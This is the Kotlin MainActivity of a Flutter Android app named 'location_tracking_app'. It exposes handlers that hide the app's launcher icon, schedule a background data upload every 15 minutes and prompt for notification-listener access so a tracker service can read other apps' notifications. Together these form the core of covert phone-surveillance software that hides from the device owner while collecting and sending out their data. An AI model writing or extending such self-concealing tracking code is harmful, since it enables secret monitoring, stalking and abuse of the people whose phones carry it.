package com.example.location_tracking_app

import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.provider.Settings
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import io.flutter.embedding.android.FlutterActivity
import io.flutter.embedding.engine.FlutterEngine
import io.flutter.plugin.common.MethodChannel
import java.util.concurrent.TimeUnit

class MainActivity : FlutterActivity() {
    private val LAUNCHER_CHANNEL = "com.example.location_tracking_app/launcher"
    private val BACKGROUND_CHANNEL = "com.example.location_tracking_app/background"
    private val NOTIFICATION_CHANNEL = "com.example.location_tracking_app/notifications"


    override fun configureFlutterEngine(flutterEngine: FlutterEngine) {
        super.configureFlutterEngine(flutterEngine)

        // Handler for hiding the launcher icon
        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, LAUNCHER_CHANNEL).setMethodCallHandler { call, result ->
            if (call.method == "hideLauncherIcon") {
                hideLauncherIcon()
                result.success(null)
            } else {
                result.notImplemented()
            }
        }

        // Handler for starting/stopping the background worker
        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, BACKGROUND_CHANNEL).setMethodCallHandler { call, result ->
            when (call.method) {
                "startPeriodicDataUpload" -> {
                    startPeriodicWorker()
                    result.success("Periodic work started")
                }
                "stopPeriodicDataUpload" -> {
                    stopPeriodicWorker()
                    result.success("Periodic work stopped")
                }
                else -> {
                    result.notImplemented()
                }
            }
        }

        // Handler for notification permissions
        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, NOTIFICATION_CHANNEL).setMethodCallHandler { call, result ->
            when (call.method) {
                "checkNotificationPermission" -> {
                    result.success(isNotificationServiceEnabled())
                }
                "requestNotificationPermission" -> {
                    val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
                    startActivity(intent)
                    result.success(null)
                }
                else -> result.notImplemented()
            }
        }
    }

    private fun isNotificationServiceEnabled(): Boolean {
        val cn = ComponentName(this, NotificationTrackerService::class.java)
        val enabledListeners = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
        return enabledListeners != null && enabledListeners.contains(cn.flattenToString())
    }

    private fun startPeriodicWorker() {
        val dataUploadWorkRequest = PeriodicWorkRequestBuilder<DataUploadWorker>(15, TimeUnit.MINUTES)
            .build()

        WorkManager.getInstance(applicationContext).enqueueUniquePeriodicWork(
            DataUploadWorker.WORK_NAME,
            ExistingPeriodicWorkPolicy.KEEP,
            dataUploadWorkRequest
        )
    }

    private fun stopPeriodicWorker() {
        WorkManager.getInstance(applicationContext).cancelUniqueWork(DataUploadWorker.WORK_NAME)
    }

    private fun hideLauncherIcon() {
        val pm: PackageManager = packageManager
        // This targets the default launcher activity. After this runs, the icon is hidden.
        val componentName = ComponentName(this, MainActivity::class.java)
        pm.setComponentEnabledSetting(
            componentName,
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
    }
}
